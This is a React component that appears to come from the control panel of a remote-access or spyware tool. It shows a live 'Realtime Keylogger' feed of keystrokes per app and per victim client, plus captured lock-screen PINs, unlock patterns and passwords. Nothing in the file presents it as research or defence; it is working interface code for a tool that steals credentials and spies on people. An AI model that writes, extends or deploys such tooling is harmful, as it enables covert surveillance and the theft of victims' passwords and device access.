
import { Keyboard, KeyRound, Lock } from 'lucide-react'
import { useAppSelector } from '@/store/hooks'

export function KeylogTab({ clientId }: { clientId: string }) {
  const keylog = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.keylog ?? [],
  )
  const lockCreds = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.lockCreds ?? [],
  )

  return (
    <div className="space-y-4">
      <div className="flex items-center gap-2">
        <Keyboard className="h-4 w-4 text-emerald-400" />
        <h3 className="text-sm font-semibold text-zinc-100">Realtime Keylogger</h3>
        <span className="inline-flex items-center gap-1 rounded bg-emerald-500/15 px-1.5 py-0.5 text-[10px] font-medium text-emerald-300 ring-1 ring-emerald-500/30">
          <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 pulse-emerald" />
          Live
        </span>
      </div>
      <p className="text-xs text-zinc-500">
        Captures keystrokes and lock-screen credentials as they are entered on
        the device.
      </p>

      {lockCreds.length > 0 && (
        <div className="rounded-xl border border-amber-500/30 bg-amber-500/[0.06] p-3">
          <div className="flex items-center gap-2 text-amber-300 text-xs font-semibold uppercase tracking-wider mb-2">
            <Lock className="h-3.5 w-3.5" /> Captured Lock Credentials
          </div>
          <div className="space-y-1.5">
            {lockCreds.map((c, i) => (
              <div
                key={i}
                className="rounded-lg bg-black/30 px-3 py-2 text-xs"
              >
                <div className="text-zinc-500 mb-1">{c.capturedAt}</div>
                <div className="flex flex-wrap gap-x-4 gap-y-1 font-mono">
                  {c.pin && (
                    <span className="text-amber-300">
                      PIN: <b>{c.pin}</b>
                    </span>
                  )}
                  {c.pattern && (
                    <span className="text-amber-300">
                      Pattern: <b>{c.pattern}</b>
                    </span>
                  )}
                  {c.password && (
                    <span className="text-amber-300">
                      Password: <b>{c.password}</b>
                    </span>
                  )}
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      <div className="rounded-xl border border-white/10 bg-black/40 max-h-80 overflow-y-auto scrollbar-emerald p-2 space-y-1">
        {keylog.length === 0 ? (
          <div className="px-3 py-8 text-center text-xs text-zinc-600">
            Waiting for keystrokes…
          </div>
        ) : (
          keylog.map((k, i) => (
            <div
              key={i}
              className="flex items-start gap-2 rounded px-2 py-1.5 hover:bg-white/[0.03]"
            >
              <KeyRound className="mt-0.5 h-3.5 w-3.5 shrink-0 text-emerald-400/70" />
              <div className="min-w-0 flex-1">
                <div className="flex items-center justify-between gap-2 text-[10px] text-zinc-500">
                  <span className="truncate font-medium text-zinc-400">
                    {k.app}
                  </span>
                  <span className="shrink-0">{k.time}</span>
                </div>
                <div className="text-sm text-zinc-200 font-mono break-all">
                  {k.data}
                </div>
              </div>
            </div>
          ))
        )}
      </div>
    </div>
  )
}
